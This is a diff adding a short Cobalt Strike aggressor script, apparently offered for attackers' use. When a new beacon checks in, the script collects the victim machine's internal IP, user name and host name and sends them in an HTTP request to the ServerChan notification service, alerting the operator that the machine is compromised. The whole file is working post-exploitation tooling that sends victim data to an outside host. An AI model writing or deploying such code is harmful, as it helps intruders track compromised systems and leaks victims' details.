@@ -1,0 +1,26 @@
+on beacon_initial {
+
+	sub http_get {
+		local('$output');
+		$url = [new java.net.URL: $1];
+		$stream = [$url openStream];
+		$handle = [SleepUtils getIOHandle: $stream, $null];
+
+		@content = readAll($handle);
+
+		foreach $line (@content) {
+			$output .= $line . "\r\n";
+		}
+
+		println($output);
+	}
+	$internalIP = replace(beacon_info($1, "internal"), " ", "_");
+	$userName = replace(beacon_info($1, "user"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+
+	#注册并且获取api (http://sc.ftqq.com/)
+	$url = 'https://sc.ftqq.com/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.send?text=CobaltStrike%20Online%20Reminder&desp=%0D%0A%0D%0AIP:'.$internalIP.'%0D%0A%0D%0AUserName:'.$userName.'%0D%0A%0D%0AHostName:'.$computerName;
+
+	http_get($url);
+
+}
